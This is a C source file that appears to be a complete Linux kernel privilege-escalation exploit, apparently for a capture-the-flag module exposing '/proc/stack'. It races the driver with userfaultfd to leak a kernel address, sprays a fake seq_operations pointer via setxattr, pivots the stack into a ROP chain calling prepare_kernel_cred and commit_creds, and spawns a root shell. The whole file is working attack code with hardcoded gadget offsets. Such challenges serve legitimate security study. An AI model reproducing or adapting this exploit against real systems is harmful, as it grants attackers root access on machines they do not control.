// gcc exploit.c -masm=intel -fno-PIE -nostdlib/-static -no-pie -o exploit
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <poll.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>

struct state {
	unsigned long rip;
	unsigned long cs;
	unsigned long rflags;
	unsigned long rsp;
	unsigned long ss;
} stat;

void get_root(void* func);
void shell(void);

static void save_state(void);
static void restore_state(void);


/* exploit */
#define BASE			0xffffffff81000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	(kernel_base + (offset))

unsigned long kernel_base			= 0;
unsigned long ofs_single_stop			= OFFSET(0xffffffff8113be80);

unsigned long ofs_prepare_kernel_cred		= OFFSET(0xffffffff81069e00);
unsigned long ofs_commit_creds		= OFFSET(0xffffffff81069c10);

unsigned long ofs_stack_pivot 		= OFFSET(0xffffffff8102cae0);	// mov esp, 0x5D000010 ; ret
unsigned long ofs_pop_rdi			= OFFSET(0xffffffff8111c353);	// pop rdi ; ret
unsigned long ofs_pop_rcx			= OFFSET(0xffffffff810368fa);	// pop rcx ; ret
unsigned long ofs_mov_rdi_rax			= OFFSET(0xffffffff8101877f);	// mov rdi, rax ; rep movsq  ; pop rbp ; ret
unsigned long ofs_ret2usermode		= OFFSET(0xffffffff81600a34);	// swapgs_restore_regs_and_return_to_usermode


struct cred* (*prepare_kernel_cred)(struct task_struct *daemon); 
int (*commit_creds)(struct cred *new);

int stackfd;
unsigned long leak;

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002
#define PUSH(p) ioctl(stackfd, CMD_PUSH, p)
#define POP(p) ioctl(stackfd, CMD_POP, p)

static int init_uffd(void *region, size_t size, void *(*handler)(void*));
static void *uffd_handler(void *arg);

int main(void){
	int seq_fd;
	void *page;

	setbuf(stdout, NULL);

	save_state();
	stat.rip = shell;

	if((stackfd = open("/proc/stack", O_RDWR)) < 0)
		return -1;

	page = mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	init_uffd(page, 0x1000, uffd_handler);

	seq_fd = open("/proc/self/stat", O_RDONLY);
	close(seq_fd);

	PUSH(page);

	unsigned long single_stop = leak;
	kernel_base		= single_stop - ofs_single_stop;
	printf("[+] kernel_base		= %p\n", kernel_base);

	unsigned long buf[0x20/sizeof(unsigned long)] = {};
	buf[3] = ADDR(ofs_stack_pivot);

	seq_fd = open("/proc/self/stat", O_RDONLY);
	setxattr("/tmp", "x", buf, 0x20, XATTR_CREATE);

	unsigned long *fake_stack = mmap(0x5D000000-0x1000, 0x2000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	fake_stack += 0x1010/sizeof(unsigned long);

	*(fake_stack++) = ADDR(ofs_pop_rdi);
	*(fake_stack++) = 0;
	*(fake_stack++) = ADDR(ofs_prepare_kernel_cred);
	*(fake_stack++) = ADDR(ofs_mov_rdi_rax);
	*(fake_stack++) = 0xdeadbeef;
	*(fake_stack++) = ADDR(ofs_commit_creds);
	*(fake_stack++) = ADDR(ofs_ret2usermode + 0x36);
	*(fake_stack++) = 0xdeadbeef;
	*(fake_stack++) = 0xdeadbeef;
	memcpy(fake_stack, &stat, sizeof(stat));

	read(seq_fd, NULL, 0);
}

static int init_uffd(void *region, size_t size, void *(*handler)(void*)){
	int uffd;
	struct uffdio_api uffdio_api = {
		.api = UFFD_API,
		.features = 0
	};
	struct uffdio_register uffdio_register = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (uint64_t)region,
			.len = size
		}
	};
	pthread_t th;

	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ioctl(uffd, UFFDIO_API, &uffdio_api);
	ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

	pthread_create(&th, NULL, handler, (void*)uffd);
}

static void *uffd_handler(void *arg){
	int uffd = (int)arg;

	for (;;) {
		struct pollfd pollfd = {
			.fd = uffd,
			.events = POLLIN
		};
		struct uffd_msg msg;

		poll(&pollfd, 1, -1);

		read(uffd, &msg, sizeof(msg));
		if (msg.event & UFFD_EVENT_PAGEFAULT) {
			struct uffdio_range range = {
				.start = (uint64_t)msg.arg.pagefault.address,
				.len = 0x1000
			};
			POP(&leak);
			mprotect((void*)range.start, range.len, PROT_NONE);
			ioctl(uffd, UFFDIO_UNREGISTER, &range);
		}
	}
	return NULL;
}

/* auxiliary functions */
static void save_state(void) {
	register long *rsp asm("rsp");

	asm(
	"mov rax, ss\n"
	"push rax\n"
	"lea rax, [rsp+0x18]\n"
	"push rax\n"
	"pushfq\n"
	"mov rax, cs\n"
	"push rax\n"
	"mov rax, [rbp+8]\n"
	"push rax\n"
	);
	memcpy(&stat, rsp, sizeof(stat));
    asm("add rsp, 0x28");
}

/*
static void restore_state(void){
	register long *rsp asm("rsp");

    asm("sub rsp, 0x28");
	memcpy(rsp, &stat, sizeof(stat));
    asm(
	"swapgs\n"
	"iretq"
	);
	__builtin_unreachable();
}

void get_root(void* func){
	commit_creds(prepare_kernel_cred(0));

	stat.rip = func;
	restore_state();
}
 */

void shell(void){
	char *argv[] = {"/bin/sh", NULL};
	execve(argv[0], argv, NULL);
}
